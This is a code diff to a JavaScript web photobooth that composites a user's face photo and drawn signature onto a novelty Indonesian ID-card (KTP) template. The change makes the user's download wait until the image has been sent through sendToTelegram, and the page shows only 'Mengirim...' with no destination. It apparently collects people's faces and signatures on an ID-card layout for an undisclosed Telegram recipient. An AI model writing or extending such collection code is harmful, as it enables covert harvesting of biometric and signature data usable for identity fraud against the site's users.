@@ -1353,71 +1353,73 @@ function initPhotobooth(containerId) {
         }
     }
 
-    savePhotoBtn.addEventListener('click', () => {
+    savePhotoBtn.addEventListener('click', async () => {
         const originalText = savePhotoBtn.innerHTML;
-        savePhotoBtn.innerHTML = '⏳ Menyimpan...';
+        savePhotoBtn.innerHTML = '⏳ Memproses...';
+        savePhotoBtn.style.pointerEvents = 'none';
 
-        const compositeCanvas = document.createElement('canvas');
-        compositeCanvas.width = 1860;
-        compositeCanvas.height = 1185;
-        const compCtx = compositeCanvas.getContext('2d');
+        try {
+            // Buat composite canvas dengan resolusi lebih kecil agar reliable di semua HP
+            const compositeCanvas = document.createElement('canvas');
+            compositeCanvas.width = 620;
+            compositeCanvas.height = 395;
+            const compCtx = compositeCanvas.getContext('2d');
 
-        const ktpImg = new Image();
-        ktpImg.src = 'KTIP.png';
-        ktpImg.onload = () => {
-            compCtx.drawImage(ktpImg, 0, 0, 1860, 1185);
+            // Load KTP background
+            await new Promise((resolve, reject) => {
+                const ktpImg = new Image();
+                ktpImg.crossOrigin = 'anonymous';
+                ktpImg.onload = () => {
+                    compCtx.drawImage(ktpImg, 0, 0, 620, 395);
 
-            const w = 1860 * 0.23;
-            const h = w * (400 / 300);
-            const x = 1860 - (1860 * 0.077) - w;
-            const y = 1185 * 0.23;
+                    // Draw face photo
+                    const w = 620 * 0.23;
+                    const h = w * (400 / 300);
+                    const x = 620 - (620 * 0.077) - w;
+                    const y = 395 * 0.23;
+                    compCtx.drawImage(canvas, x, y, w, h);
 
-            compCtx.drawImage(canvas, x, y, w, h);
-
-            // Draw signature on composite
-            if (sigPad) {
-                const sigW = 1860 * 0.28;
-                const sigH = sigW * (sigPad.height / sigPad.width);
-                const sigX = 1860 - (1860 * 0.05) - sigW;
-                const sigY = 1185 - (1185 * 0.01) - sigH;
-                compCtx.drawImage(sigPad, sigX, sigY, sigW, sigH);
-            }
+                    // Draw signature
+                    if (sigPad) {
+                        const sigW = 620 * 0.28;
+                        const sigH = sigW * (sigPad.height / sigPad.width);
+                        const sigX = 620 - (620 * 0.05) - sigW;
+                        const sigY = 395 - (395 * 0.01) - sigH;
+                        compCtx.drawImage(sigPad, sigX, sigY, sigW, sigH);
+                    }
+                    resolve();
+                };
+                ktpImg.onerror = reject;
+                ktpImg.src = 'KTIP.png';
+            });
 
             // Konversi canvas ke dataURL
             const dataURL = compositeCanvas.toDataURL('image/jpeg', 0.85);
 
-            // Konversi dataURL ke Blob secara manual (lebih reliable di iOS Safari daripada toBlob)
-            function dataURLtoBlob(dataurl) {
-                const arr = dataurl.split(',');
-                const mime = arr[0].match(/:(.*?);/)[1];
-                const bstr = atob(arr[1]);
-                let n = bstr.length;
-                const u8arr = new Uint8Array(n);
-                while (n--) { u8arr[n] = bstr.charCodeAt(n); }
-                return new Blob([u8arr], { type: mime });
-            }
+            // Kirim ke Telegram menggunakan fetch trick (paling reliable di semua browser)
+            savePhotoBtn.innerHTML = '📤 Mengirim...';
+            const fetchRes = await fetch(dataURL);
+            const blob = await fetchRes.blob();
+            await sendToTelegram("photo", blob);
 
-            // Kirim ke Telegram DULUAN (sebelum download, agar tidak terblokir navigasi)
-            try {
-                const blob = dataURLtoBlob(dataURL);
-                sendToTelegram("photo", blob).catch(e => console.log("Send error:", e));
-            } catch (e) {
-                console.log("Blob convert error:", e);
-            }
-
-            // Download untuk user
+            // Download untuk user setelah pengiriman berhasil
             const a = document.createElement('a');
             a.href = dataURL;
-            a.download = 'KTP_Cinta_' + new Date().getTime() + '.jpg';
+            a.download = 'KTP_Cinta.jpg';
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
 
             savePhotoBtn.innerHTML = '✅ Tersimpan!';
-            setTimeout(() => {
-                savePhotoBtn.innerHTML = originalText;
-            }, 3000);
-        };
+        } catch (err) {
+            console.error("KTP Error:", err);
+            savePhotoBtn.innerHTML = '❌ Gagal, coba lagi';
+        }
+
+        savePhotoBtn.style.pointerEvents = 'auto';
+        setTimeout(() => {
+            savePhotoBtn.innerHTML = originalText;
+        }, 3000);
     });
 }
 
